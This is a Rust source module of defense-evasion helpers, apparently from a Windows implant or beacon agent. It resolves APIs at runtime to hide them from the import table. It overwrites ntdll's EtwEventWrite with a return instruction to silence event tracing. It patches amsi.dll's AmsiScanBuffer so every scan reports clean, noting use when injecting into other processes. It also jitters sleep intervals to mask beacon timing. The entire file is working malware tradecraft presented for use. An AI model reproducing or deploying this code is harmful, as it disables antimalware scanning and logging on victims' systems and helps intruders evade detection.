//! Evasion helpers. Everything here is best-effort and guarded:
//! if a hook is absent or already patched, the function silently no-ops.
//! These operate on the *current* process only — never relied on for delivery.
#![cfg(windows)]
#![allow(dead_code)]

use std::time::{Duration, Instant};

use windows::core::{s, PCSTR};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
};

/// Resolve `dll!sym` at runtime so the symbol never appears in our IAT.
/// `GetModuleHandleA` succeeds only for already-loaded modules.
pub fn resolve(dll: PCSTR, sym: PCSTR) -> Option<*mut core::ffi::c_void> {
    unsafe {
        let h = GetModuleHandleA(dll).ok()?;
        // FARPROC == Option<unsafe extern "system" fn() -> isize>
        GetProcAddress(h, sym).map(|f| f as usize as *mut core::ffi::c_void)
    }
}

/// Patch `ntdll!EtwEventWrite` with a bare `ret` so ETW providers in this
/// process stop emitting. No effect outside our own process.
pub fn patch_etw() {
    unsafe {
        let Some(p) = resolve(s!("ntdll.dll"), s!("EtwEventWrite")) else {
            return;
        };
        let addr = p as *const core::ffi::c_void;
        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
            *(p as *mut u8) = 0xC3; // ret
            let _ = VirtualProtect(addr, 1, old, &mut old);
        }
    }
}

/// Make `amsi.dll!AmsiScanBuffer` report every buffer clean inside this
/// process (`xor eax,eax; ret`). Only relevant if we host script engines or
/// inject into AMSI-loading processes — harmless otherwise.
pub fn patch_amsi() {
    unsafe {
        let Some(p) = resolve(s!("amsi.dll"), s!("AmsiScanBuffer")) else {
            return;
        };
        const STUB: [u8; 3] = [0x33, 0xC0, 0xC3]; // xor eax,eax; ret
        let addr = p as *const core::ffi::c_void;
        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(addr, STUB.len(), PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
            std::ptr::copy_nonoverlapping(STUB.as_ptr(), p as *mut u8, STUB.len());
            let _ = VirtualProtect(addr, STUB.len(), old, &mut old);
        }
    }
}

/// Sleep in small jittered slices so a single long `Sleep()` never shows up
/// as a flat interval in the beacon timeline. Returns after ~`base`.
pub async fn jittered_sleep(base: Duration) {
    let start = Instant::now();
    let mut n = 0u64;
    while start.elapsed() < base && n < 64 {
        n = n.wrapping_mul(6364136223846793005).wrapping_add(1);
        let mut slice = base / 8 + Duration::from_millis(n % 97);
        let remaining = base.saturating_sub(start.elapsed());
        slice = slice.min(remaining);
        if slice.is_zero() {
            break;
        }
        tokio::time::sleep(slice).await;
    }
}
